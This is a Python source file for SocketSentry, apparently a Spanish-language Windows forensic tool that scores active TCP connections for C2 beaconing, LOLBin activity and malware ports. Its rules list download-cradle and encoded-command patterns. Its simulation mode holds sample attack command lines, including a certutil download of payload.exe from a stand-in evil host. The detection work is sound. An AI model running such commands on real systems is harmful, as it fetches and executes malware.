#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SocketSentry v3.0.0 | Framework Forense y Hunter de Conexiones de Red, Sockets y C2 en Windows
Desarrollado por: Ezequiel Diaz (Cru9) | https://github.com/Cru9
Parte del Ecosistema WinAudit-DFIR
"""

import os
import sys
import re
import json
import csv
import time
import socket
import datetime
import platform
import subprocess
import html
import ctypes
from pathlib import Path
from typing import Dict, List, Any, Optional

# Habilitar soporte VT100 para colores ANSI en Windows
os.system('')

# Paleta de colores ANSI
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

SCRIPT_DIR = Path(__file__).resolve().parent
REPORTS_DIR = SCRIPT_DIR / "Reportes"
ASSETS_DIR = SCRIPT_DIR / "assets"
DB_PATH = SCRIPT_DIR / "db_conexiones.json"
REPORTS_DIR.mkdir(parents=True, exist_ok=True)
ASSETS_DIR.mkdir(parents=True, exist_ok=True)

try:
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass


def is_admin() -> bool:
    """Verifica si el proceso actual cuenta con privilegios de Administrador."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def request_elevation():
    """Solicita elevación UAC en una nueva ventana si no es administrador."""
    try:
        script = str(Path(__file__).resolve())
        params = f'"{script}"'
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}[!] No se pudo solicitar elevación UAC: {e}{RESET}")


def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = r"""==============================================================================
   ____             _        _   ____             _              
  / ___|  ___   ___| | _____| |_/ ___|  ___ _ __ | |_ _ __ _   _ 
  \___ \ / _ \ / __| |/ / _ \ __\___ \ / _ \ '_ \| __| '__| | | |
   ___) | (_) | (__|   <  __/ |_ ___) |  __/ | | | |_| |  | |_| |
  |____/ \___/ \___|_|\_\___|\__|____/ \___|_| |_|\__|_|   \__, |
                                                          |___/  
=============================================================================="""
    print(f"{CYAN}{BOLD}{banner}{MAGENTA}")
    print("  Framework Forense de Sockets, C2 Beacon Hunter & Auditoría de Red")
    print("  Ecosistema Cru9 | Windows Network Security Intelligence | v3.0.0")
    print(f"=============================================================================={RESET}\n")


def is_private_ip(ip: str) -> str:
    """Clasifica la dirección IP remota en Local, Privada (RFC 1918) o WAN Pública."""
    ip = ip.strip()
    if not ip or ip in ["*", "0.0.0.0", "::", "::1", "127.0.0.1", "localhost"]:
        return "Local (Loopback)"
    if ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("169.254."):
        return "Red Privada Local"
    if ip.startswith("172."):
        try:
            second_octet = int(ip.split(".")[1])
            if 16 <= second_octet <= 31:
                return "Red Privada Local"
        except Exception:
            pass
    return "Pública / Internet (EXTERNA)"


def load_threat_database() -> Dict[str, Any]:
    """Carga la base de datos local de IoCs, reglas heurísticas, LOLBins y puertos de malware."""
    if DB_PATH.exists():
        try:
            with open(DB_PATH, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"{YELLOW}[!] Aviso al leer db_conexiones.json: {e}. Usando reglas integradas.{RESET}")
    
    # Reglas integradas por defecto si el archivo no existe
    return {
        "Version": "1.2",
        "RutasSospechosas": [
            {"Patron": r"\\AppData\\Local\\Temp", "Puntos": 40, "Motivo": "Ejecutable en carpeta temporal de usuario (%TEMP%)"},
            {"Patron": r"\\Windows\\Temp", "Puntos": 40, "Motivo": "Ejecutable en carpeta temporal del sistema (Windows\\Temp)"},
            {"Patron": r"\\Users\\Public", "Puntos": 35, "Motivo": "Ejecutable en C:\\Users\\Public (directorio de staging de malware)"},
            {"Patron": r"\\AppData\\Roaming", "Puntos": 25, "Motivo": "Ejecutable en AppData Roaming (frecuente en stealers/troyanos)"}
        ],
        "ArgumentosSospechosos": [
            {"Patron": r"(?i)-(enc|encodedcommand)\b", "Puntos": 35, "Motivo": "Comando Base64 ofuscado (-EncodedCommand)"},
            {"Patron": r"(?i)-(w|windowstyle)\s+hidden", "Puntos": 25, "Motivo": "Ejecución oculta en segundo plano (-WindowStyle Hidden)"},
            {"Patron": r"(?i)(downloadstring|downloaddata|iwr\s|invoke-webrequest)", "Puntos": 35, "Motivo": "Cradle de descarga en memoria"}
        ],
        "PuertosMalware": {
            "4444": "Metasploit / Meterpreter Default Listener",
            "1337": "Backdoor Clásico / C2 Hacker",
            "50050": "Cobalt Strike TeamServer Default Port",
            "8888": "C2 HTTP Alternativo / Proxy Malicioso",
            "9999": "Reverse Shell Común"
        },
        "LOLBins": ["powershell.exe", "cmd.exe", "certutil.exe", "bitsadmin.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe", "wscript.exe", "cscript.exe"]
    }


def get_system_processes() -> Dict[int, Dict[str, str]]:
    """Extrae todos los procesos de Windows con CommandLine y ExecutablePath de forma rápida."""
    procs = {}
    ps_cmd = "Get-CimInstance Win32_Process | Select-Object ProcessId, Name, ExecutablePath, CommandLine | ConvertTo-Json -Compress"
    try:
        res = subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], capture_output=True, text=True, errors="replace")
        out = res.stdout.strip()
        if out.startswith("[") or out.startswith("{"):
            data = json.loads(out)
            if isinstance(data, dict):
                data = [data]
            for p in data:
                pid = p.get("ProcessId")
                if pid:
                    procs[int(pid)] = {
                        "Name": p.get("Name") or "Desconocido",
                        "Path": p.get("ExecutablePath") or "-",
                        "CommandLine": p.get("CommandLine") or ""
                    }
    except Exception:
        pass

    # Fallback con tasklist si powershell falló
    if not procs:
        try:
            tl = subprocess.run("tasklist /fo csv /nh", shell=True, capture_output=True, text=True, errors="replace")
            for line in tl.stdout.splitlines():
                parts = [p.strip(' "') for p in line.split('","')]
                if len(parts) >= 2:
                    name, pid_str = parts[0], parts[1]
                    if pid_str.isdigit():
                        procs[int(pid_str)] = {"Name": name, "Path": "-", "CommandLine": ""}
        except Exception:
            pass

    return procs


# ==============================================================================
# CLASE PRINCIPAL: SOCKET SENTRY ENGINE
# ==============================================================================
class SocketSentry:
    def __init__(self, alert_threshold: int = 30):
        self.alert_threshold = alert_threshold
        self.hostname = platform.node()
        self.os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
        self.db = load_threat_database()
        self.connections: List[Dict[str, Any]] = []
        self.suspicious_connections: List[Dict[str, Any]] = []
        self.beaconing_history: Dict[str, List[float]] = {}
        self.global_risk_score = 0
        self.global_risk_level = "BAJO"

    def scan_active_sockets(self, include_local: bool = True) -> List[Dict[str, Any]]:
        """Escanea todas las conexiones TCP activas y las correlaciona con procesos y reglas de amenaza."""
        procs = get_system_processes()
        results = []

        try:
            raw_netstat = subprocess.check_output("netstat -ano -p tcp", shell=True, text=True, errors="replace")
        except Exception:
            raw_netstat = ""

        lines = raw_netstat.splitlines()
        for line in lines:
            parts = line.split()
            # Formato netstat: TCP  LocalAddress:Port  ForeignAddress:Port  State  PID
            if len(parts) >= 5 and parts[0].upper() == "TCP":
                local_addr = parts[1]
                foreign_addr = parts[2]
                state = parts[3]
                pid_str = parts[4]

                if not pid_str.isdigit():
                    continue
                pid = int(pid_str)

                # Parsear IP y Puerto remoto
                if ":" in foreign_addr:
                    rem_ip, rem_port = foreign_addr.rsplit(":", 1)
                else:
                    rem_ip, rem_port = foreign_addr, "-"

                # Parsear IP y Puerto local
                if ":" in local_addr:
                    loc_ip, loc_port = local_addr.rsplit(":", 1)
                else:
                    loc_ip, loc_port = local_addr, "-"

                ip_type = is_private_ip(rem_ip)
                if not include_local and ip_type in ["Local (Loopback)", "Red Privada Local"]:
                    continue

                proc_info = procs.get(pid, {"Name": "Desconocido", "Path": "-", "CommandLine": ""})
                proc_name = proc_info["Name"]
                proc_path = proc_info["Path"]
                cmd_line = proc_info["CommandLine"]

                # ==============================================================
                # MOTOR HEURÍSTICO DE AMENAZAS (THREAT SCORING)
                # ==============================================================
                score = 0
                motivos = []

                # 1. Verificación de Puertos de Malware
                ports_list = self.db.get("PuertosSospechosos", [])
                for p_rule in ports_list:
                    if str(p_rule.get("Puerto")) == str(rem_port):
                        pts = p_rule.get("Puntos", 40)
                        amenaza = p_rule.get("Amenaza", "Puerto sospechoso catalogado")
                        score += pts
                        motivos.append(f"Puerto de amenaza conocido ({rem_port} - {amenaza})")
                        break

                # 2. Rutas Sospechosas de Ejecución
                for r_rule in self.db.get("RutasSospechosas", []):
                    pat = r_rule.get("Patron", "")
                    if pat and re.search(pat, proc_path, re.IGNORECASE):
                        pts = r_rule.get("Puntos", 30)
                        score += pts
                        motivos.append(r_rule.get("Motivo", "Ruta sospechosa en disco"))
                        break

                # 3. Argumentos y Comandos Sospechosos
                for a_rule in self.db.get("ArgumentosSospechosos", []):
                    pat = a_rule.get("Patron", "")
                    if pat and re.search(pat, cmd_line, re.IGNORECASE):
                        pts = a_rule.get("Puntos", 30)
                        score += pts
                        motivos.append(a_rule.get("Motivo", "Parámetro sospechoso en línea de comando"))
                        break

                # 4. Binarios LOLBins haciendo conexiones a Internet
                lolbins_rules = self.db.get("LOLBins", [])
                for lb_rule in lolbins_rules:
                    lb_name = lb_rule.get("Nombre", "") if isinstance(lb_rule, dict) else str(lb_rule)
                    if lb_name.lower() == proc_name.lower():
                        pts = lb_rule.get("Puntos", 35) if isinstance(lb_rule, dict) else 35
                        motivo_lb = lb_rule.get("Motivo", f"LOLBin del sistema ({proc_name}) con socket de red") if isinstance(lb_rule, dict) else f"LOLBin ({proc_name}) conectado"
                        if "Pública" in ip_type:
                            score += pts
                            motivos.append(f"{motivo_lb} hacia IP pública ({rem_ip})")
                        elif state == "ESTABLISHED":
                            score += min(pts, 15)
                            motivos.append(f"{motivo_lb} (Socket activo)")
                        break

                # 5. Feodo Tracker / C2 Threat Intelligence
                ioc_dict = self.db.get("IOC_C2_IPs", {})
                if isinstance(ioc_dict, dict) and rem_ip in ioc_dict:
                    c2_data = ioc_dict[rem_ip]
                    malware_name = c2_data.get("Malware", "C2 Desconocido") if isinstance(c2_data, dict) else "C2 Confirmado"
                    score += 85
                    motivos.append(f"ALERTA C2: IP Remota listada en Blacklist ({rem_ip} - Malware: {malware_name})")

                # Clasificación de severidad
                if score >= 60:
                    sev = "CRÍTICA"
                elif score >= self.alert_threshold:
                    sev = "SOSPECHOSA"
                else:
                    sev = "NORMAL"

                results.append({
                    "Protocolo": "TCP",
                    "IPLocal": loc_ip,
                    "PuertoLocal": loc_port,
                    "IPRemota": rem_ip,
                    "PuertoRemoto": rem_port,
                    "ClasificacionIP": ip_type,
                    "Estado": state,
                    "PID": pid,
                    "Proceso": proc_name,
                    "Ruta": proc_path,
                    "LineaComando": cmd_line,
                    "Puntuacion": min(score, 100),
                    "Severidad": sev,
                    "Motivos": motivos,
                    "Timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })

        self.connections = results
        self.suspicious_connections = [c for c in results if c["Severidad"] in ["CRÍTICA", "SOSPECHOSA"]]
        self.calculate_global_risk()
        return results

    def calculate_global_risk(self):
        """Calcula el puntaje de riesgo de red consolidado."""
        crit_count = len([c for c in self.connections if c["Severidad"] == "CRÍTICA"])
        susp_count = len([c for c in self.connections if c["Severidad"] == "SOSPECHOSA"])

        total_score = (crit_count * 35) + (susp_count * 15)
        self.global_risk_score = min(total_score, 100)

        if self.global_risk_score >= 60:
            self.global_risk_level = "CRÍTICO (Posible intrusión o baliza C2 activa)"
        elif self.global_risk_score >= 25:
            self.global_risk_level = "MEDIO (Conexiones sospechosas detectadas)"
        else:
            self.global_risk_level = "BAJO (Tráfico de red ordinario y confiable)"

    def inject_simulated_threats(self):
        """Inyecta conexiones de prueba realistas para validar el motor de detección."""
        sims = [
            {
                "Protocolo": "TCP", "IPLocal": "192.168.1.150", "PuertoLocal": "49512",
                "IPRemota": "185.220.101.5", "PuertoRemoto": "4444", "ClasificacionIP": "Pública / Internet (EXTERNA)",
                "Estado": "ESTABLISHED", "PID": 7842, "Proceso": "powershell.exe",
                "Ruta": r"C:\Users\User\AppData\Local\Temp\update_worker.exe",
                "LineaComando": "powershell.exe -w hidden -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
                "Puntuacion": 85, "Severidad": "CRÍTICA",
                "Motivos": ["Puerto conocido de malware (4444 - Metasploit Default Listener)", "Ejecutable en carpeta temporal de usuario (%TEMP%)", "Comando Base64 ofuscado (-EncodedCommand)", "LOLBin del sistema conectado a IP pública externa"],
                "Timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            },
            {
                "Protocolo": "TCP", "IPLocal": "192.168.1.150", "PuertoLocal": "51240",
                "IPRemota": "194.26.29.112", "PuertoRemoto": "50050", "ClasificacionIP": "Pública / Internet (EXTERNA)",
                "Estado": "ESTABLISHED", "PID": 5120, "Proceso": "rundll32.exe",
                "Ruta": r"C:\Windows\System32\rundll32.exe",
                "LineaComando": r"rundll32.exe C:\Users\Public\beacon.dll,StartW",
                "Puntuacion": 75, "Severidad": "CRÍTICA",
                "Motivos": ["Puerto conocido de malware (50050 - Cobalt Strike TeamServer)", "LOLBin del sistema ('rundll32.exe') conectado a IP pública externa"],
                "Timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            },
            {
                "Protocolo": "TCP", "IPLocal": "192.168.1.150", "PuertoLocal": "53110",
                "IPRemota": "104.21.55.12", "PuertoRemoto": "8080", "ClasificacionIP": "Pública / Internet (EXTERNA)",
                "Estado": "ESTABLISHED", "PID": 9924, "Proceso": "certutil.exe",
                "Ruta": r"C:\Windows\System32\certutil.exe",
                "LineaComando": "certutil.exe -urlcache -split -f http://evil-host.com/payload.exe",
                "Puntuacion": 65, "Severidad": "CRÍTICA",
                "Motivos": ["LOLBin del sistema ('certutil.exe') conectado a IP pública externa", "Parámetro sospechoso en línea de comando (-urlcache)"],
                "Timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        ]
        self.connections.extend(sims)
        self.suspicious_connections.extend(sims)
        self.calculate_global_risk()

    def print_cli_summary(self, suspicious_only: bool = False):
        """Muestra un resumen en consola con código de colores estructurado."""
        target_list = self.suspicious_connections if suspicious_only else self.connections
        
        print(f"{CYAN}{BOLD}==============================================================================")
        print(f"               RESUMEN DE AUDITORÍA DE SOCKETS Y RED - CRU9                   ")
        print(f"=============================================================================={RESET}")
        print(f"  {BOLD}Equipo Evaluado:{RESET} {self.hostname} | {BOLD}SO:{RESET} {self.os_info}")
        print(f"  {BOLD}Conexiones Evaluadas:{RESET} {len(self.connections)} | {BOLD}Sospechosas/Críticas:{RESET} {len(self.suspicious_connections)}")
        
        lvl_color = GREEN if "BAJO" in self.global_risk_level else (YELLOW if "MEDIO" in self.global_risk_level else RED)
        print(f"  {BOLD}Índice de Riesgo de Red:{RESET} {lvl_color}{BOLD}{self.global_risk_score}/100 [{self.global_risk_level}]{RESET}")
        print(f"{CYAN}------------------------------------------------------------------------------{RESET}")

        if not target_list:
            print(f"  {GREEN}[✓] No se detectaron conexiones sospechosas ni indicios de C2.{RESET}")
            print(f"{CYAN}=============================================================================={RESET}\n")
            return

        print(f"{'PID':<7} {'PROCESO':<18} {'ESTADO':<12} {'DESTINO':<22} {'SEVERIDAD':<12} {'SCORE'}")
        print(f"{DIM}{'-'*78}{RESET}")

        for c in target_list[:30]:
            dest = f"{c['IPRemota']}:{c['PuertoRemoto']}"
            sev = c["Severidad"]
            sev_color = RED if sev == "CRÍTICA" else (YELLOW if sev == "SOSPECHOSA" else GREEN)
            
            print(f"{c['PID']:<7} {c['Proceso'][:17]:<18} {c['Estado'][:11]:<12} {dest[:21]:<22} {sev_color}{sev:<12}{RESET} {c['Puntuacion']}/100")
            if c["Motivos"]:
                for m in c["Motivos"][:2]:
                    print(f"        {RED}↳ {m}{RESET}")

        if len(target_list) > 30:
            print(f"  {DIM}... y {len(target_list) - 30} conexiones adicionales.{RESET}")
        print(f"{CYAN}=============================================================================={RESET}\n")

    def export_json(self, filepath: Optional[Path] = None) -> Path:
        """Exporta la evidencia forense completa en formato JSON."""
        if not filepath:
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = REPORTS_DIR / f"SocketSentry_Audit_{ts}.json"

        payload = {
            "metadata": {
                "suite": "WinAudit-DFIR",
                "modulo": "SocketSentry (Auditoría de Red y Sockets)",
                "autor": "Cru9",
                "timestamp": datetime.datetime.now().isoformat(),
                "hostname": self.hostname,
                "os": self.os_info,
                "total_sockets": len(self.connections),
                "total_sospechosas": len(self.suspicious_connections),
                "risk_score": self.global_risk_score,
                "risk_level": self.global_risk_level
            },
            "conexiones": self.connections
        }
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, ensure_ascii=False)
        return filepath

    def export_csv(self, filepath: Optional[Path] = None) -> Path:
        """Exporta los sockets a formato CSV."""
        if not filepath:
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = REPORTS_DIR / f"SocketSentry_Sockets_{ts}.csv"

        with open(filepath, "w", newline="", encoding="utf-8-sig") as f:
            writer = csv.writer(f)
            writer.writerow(["Timestamp", "PID", "Proceso", "IP_Local", "Puerto_Local", "IP_Remota", "Puerto_Remoto", "Clasificacion_IP", "Estado", "Severidad", "Puntuacion", "Motivos", "Linea_Comando"])
            for c in self.connections:
                writer.writerow([
                    c.get("Timestamp"), c.get("PID"), c.get("Proceso"),
                    c.get("IPLocal"), c.get("PuertoLocal"), c.get("IPRemota"), c.get("PuertoRemoto"),
                    c.get("ClasificacionIP"), c.get("Estado"), c.get("Severidad"), c.get("Puntuacion"),
                    " | ".join(c.get("Motivos", [])), c.get("LineaComando")
                ])
        return filepath

    def generate_html_dashboard(self, filepath: Optional[Path] = None) -> Path:
        """Genera un dashboard interactivo ejecutivo con colores claros y diseño profesional."""
        if not filepath:
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = REPORTS_DIR / f"SocketSentry_Dashboard_{ts}.html"

        total_conn = len(self.connections)
        total_susp = len(self.suspicious_connections)
        total_crit = len([c for c in self.connections if c.get("Severidad") == "CRÍTICA"])
        total_lolbins = len([c for c in self.connections if c.get("Proceso", "").lower() in [
            (lb.get("Nombre", "") if isinstance(lb, dict) else str(lb)).lower() for lb in self.db.get("LOLBins", [])
        ]])
        total_external = len([c for c in self.connections if "Pública" in c.get("ClasificacionIP", "")])

        if self.global_risk_score >= 60:
            score_color = "#b91c1c"
            score_bg = "#fef2f2"
            score_border = "#fecaca"
        elif self.global_risk_score >= 25:
            score_color = "#b45309"
            score_bg = "#fffbeb"
            score_border = "#fde68a"
        else:
            score_color = "#15803d"
            score_bg = "#f0fdf4"
            score_border = "#bbf7d0"

        rows_html = []
        for c in self.connections:
            sev = c.get("Severidad", "NORMAL")
            b_cls = {
                "CRÍTICA": "badge-crit",
                "ALTA": "badge-high",
                "MEDIA": "badge-med"
            }.get(sev, "badge-clean")

            diag_txt = c.get("Diagnostico", "")
            if diag_txt and diag_txt != "Tráfico estándar":
                diag_cell = f'<span class="ioc-alert">⚠️ {html.escape(diag_txt)}</span>'
            else:
                diag_cell = '<span class="ioc-ok">✓ Tráfico normal</span>'

            rows_html.append(f"""
            <tr class="forensic-row" data-sev="{sev}">
                <td>
                    <strong style="color:var(--text-main);">{html.escape(c.get('Proceso', ''))}</strong>
                    <div style="font-size:0.75rem; color:var(--text-muted); font-family:var(--font-mono);">PID: {c.get('PID')}</div>
                </td>
                <td><span class="proto-badge">{c.get('Protocolo')}</span></td>
                <td><code class="mono-code">{html.escape(c.get('DireccionLocal', ''))}</code></td>
                <td><code class="mono-code">{html.escape(c.get('DireccionRemota', ''))}</code></td>
                <td>{c.get('Estado')}</td>
                <td><span class="badge {b_cls}">{sev}</span></td>
                <td>{diag_cell}</td>
            </tr>
            """)

        metrics = [


            {"label": "Sockets Activos", "value": total_conn, "icon": "🔌"},


            {"label": "Conexiones Sospechosas", "value": total_susp, "icon": "⚠️"},


            {"label": "Severidad Crítica", "value": total_crit, "icon": "🚨"},


            {"label": "LOLBins en Red", "value": total_lolbins, "icon": "⚡"},


            {"label": "IPs Públicas WAN", "value": total_external, "icon": "🌐"}


        ]


        headers = [


            "Proceso & PID", "Protocolo", "Dirección Local", "Dirección Remota",


            "Estado", "Severidad", "Diagnóstico Forense"


        ]


        try:


            import forensic_theme


        except ImportError:


            base_dir = Path(__file__).resolve().parent.parent


            if str(base_dir) not in sys.path:


                sys.path.insert(0, str(base_dir))


            import forensic_theme



        html_content = forensic_theme.render_homologated_dashboard(


            title="Threat Hunter de Red & Sockets Activos",


            sentry_id="3",


            sentry_name="SocketSentry",


            sentry_icon="🔌",


            subtitle="Inspección profunda de sockets TCP/UDP, detección de balizas C2 y LOLBins en red",


            metrics=metrics,


            table_headers=headers,


            table_rows_html="".join(rows_html),


            risk_score=self.global_risk_score,


            back_url="../../index.html"


        )
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(html_content)
        return filepath

    def live_beacon_monitor(self, interval: int = 5):
        """Monitorea el tráfico de red en bucle continuo para detectar balizas C2 (Beaconing)."""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{CYAN}{BOLD}==============================================================================")
        print("      CENTINELA DE RED EN TIEMPO REAL (LIVE BEACON & C2 SOCKET MONITOR)       ")
        print(f"==============================================================================")
        print(f"  Vigilando: Sockets TCP, Puertos Inseguros, LOLBins y Balizas Periódicas")
        print(f"  Intervalo: Cada {interval}s | [Presiona 'Ctrl+C' para detener el monitor]")
        print(f"=============================================================================={RESET}\n")

        cycle = 0
        try:
            while True:
                cycle += 1
                now_str = datetime.datetime.now().strftime("%H:%M:%S")
                self.scan_active_sockets(include_local=False)
                
                sys.stdout.write(f"\r  {CYAN}[Ciclo #{cycle}]{RESET} {now_str} | Evaluando {len(self.connections)} sockets activos... ")
                sys.stdout.flush()

                if self.suspicious_connections:
                    print(f"\n  {RED}{BOLD}[!] ALERTA DE AMENAZA DE RED:{RESET}")
                    for s in self.suspicious_connections:
                        print(f"      • PID {s['PID']} ({s['Proceso']}) -> {s['IPRemota']}:{s['PuertoRemoto']} [{s['Severidad']}]")
                        for m in s.get("Motivos", []):
                            print(f"        {YELLOW}↳ {m}{RESET}")
                    print('\a', end='')

                time.sleep(interval)
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}[*] Centinela de red detenido por el usuario.{RESET}")


# ==============================================================================
# MENU INTERACTIVO Y CLI
# ==============================================================================
def interactive_menu():
    sentry = SocketSentry(alert_threshold=30)

    while True:
        show_banner()
        print("  Selecciona una opción de análisis forense de red:")
        print("  ────────────────────────────────────────────────────────────────────────")
        print("  [1] 🚀 Escaneo Completo de Conexiones Activas (Live Network Triage)")
        print("  [2] 🎯 Filtrar Exclusivamente Conexiones Sospechosas / Críticas")
        print("  [3] 🥷 Hunter de LOLBins y Binarios del Sistema en Red")
        print("  [4] 📡 Centinela de Red & Detector de Balizas C2 en Tiempo Real")
        print("  [5] 📊 Generar y Abrir Dashboard HTML Cyberpunk (Reporte Ejecutivo)")
        print("  [6] 💾 Exportar Evidencias Multi-formato (JSON + CSV)")
        print("  [7] 🧪 Modo Simulación Forense (Inyección de Amenazas de Prueba)")
        print("  [0] 🚪 Salir")
        print("  ────────────────────────────────────────────────────────────────────────")

        choice = input("\n  Ingrese una opción [0-7]: ").strip()

        if choice == "1":
            print(f"\n{CYAN}[*] Escaneando sockets y correlacionando procesos en memoria...{RESET}")
            sentry.scan_active_sockets()
            sentry.print_cli_summary(suspicious_only=False)
            input("\n  Presiona Enter para continuar...")

        elif choice == "2":
            print(f"\n{CYAN}[*] Analizando y filtrando conexiones sospechosas...{RESET}")
            sentry.scan_active_sockets()
            sentry.print_cli_summary(suspicious_only=True)
            input("\n  Presiona Enter para continuar...")

        elif choice == "3":
            print(f"\n{CYAN}[*] Inspeccionando actividad de LOLBins en red...{RESET}")
            sentry.scan_active_sockets()
            lolbins = [(lb.get("Nombre", "") if isinstance(lb, dict) else str(lb)).lower() for lb in sentry.db.get("LOLBins", [])]
            lb_matches = [c for c in sentry.connections if c.get("Proceso", "").lower() in lolbins]
            
            print(f"\n{CYAN}{BOLD}=== LOLBINS ACTIVOS EN RED ==={RESET}")
            if lb_matches:
                for lb in lb_matches:
                    print(f"  • PID {lb['PID']} | {lb['Proceso']} -> {lb['IPRemota']}:{lb['PuertoRemoto']} ({lb['ClasificacionIP']})")
                    if lb.get("LineaComando"):
                        print(f"    Comando: {lb['LineaComando']}")
            else:
                print(f"  {GREEN}[✓] No se detectaron LOLBins con conexiones de red activas.{RESET}")
            input("\n  Presiona Enter para continuar...")

        elif choice == "4":
            sentry.live_beacon_monitor(interval=5)
            input("\n  Presiona Enter para continuar...")

        elif choice == "5":
            if not sentry.connections:
                sentry.scan_active_sockets()
            hp = sentry.generate_html_dashboard()
            print(f"\n{GREEN}[+] Dashboard HTML generado en: {hp}{RESET}")
            try:
                os.startfile(hp)
            except Exception:
                pass
            input("\n  Presiona Enter para continuar...")

        elif choice == "6":
            if not sentry.connections:
                sentry.scan_active_sockets()
            jp = sentry.export_json()
            cp = sentry.export_csv()
            print(f"\n{GREEN}[+] Evidencias exportadas en 'Reportes/':{RESET}")
            print(f"    • JSON: {jp}")
            print(f"    • CSV:  {cp}")
            input("\n  Presiona Enter para continuar...")

        elif choice == "7":
            sentry.scan_active_sockets()
            sentry.inject_simulated_threats()
            print(f"\n{YELLOW}[!] Amenazas de prueba inyectadas (Metasploit, Cobalt Strike, Certutil).{RESET}")
            sentry.print_cli_summary(suspicious_only=True)
            input("\n  Presiona Enter para continuar...")

        elif choice == "0":
            print(f"\n{CYAN}Gracias por utilizar SocketSentry de Cru9.{RESET}\n")
            break


def main():
    if len(sys.argv) > 1:
        import argparse
        parser = argparse.ArgumentParser(description="SocketSentry | Network Socket Threat Hunter & DFIR Framework")
        parser.add_argument("--scan", action="store_true", help="Escanea sockets activos y muestra resumen")
        parser.add_argument("--suspicious-only", action="store_true", help="Filtra exclusivamente conexiones sospechosas")
        parser.add_argument("--html", action="store_true", help="Genera el Dashboard HTML interactivo")
        parser.add_argument("--json", action="store_true", help="Exporta la evidencia a JSON")
        parser.add_argument("--csv", action="store_true", help="Exporta los sockets a CSV")
        parser.add_argument("--monitor", action="store_true", help="Inicia el centinela en tiempo real")
        parser.add_argument("--simulate", action="store_true", help="Inyecta conexiones de prueba realistas")
        args = parser.parse_args()

        sentry = SocketSentry()
        if args.monitor:
            sentry.live_beacon_monitor()
            return

        sentry.scan_active_sockets()
        if args.simulate:
            sentry.inject_simulated_threats()

        if args.scan or args.suspicious_only:
            sentry.print_cli_summary(suspicious_only=args.suspicious_only)

        if args.json:
            jp = sentry.export_json()
            print(f"[+] JSON: {jp}")
        if args.csv:
            cp = sentry.export_csv()
            print(f"[+] CSV: {cp}")
        if args.html:
            hp = sentry.generate_html_dashboard()
            print(f"[+] HTML: {hp}")
        return

    interactive_menu()


if __name__ == "__main__":
    main()
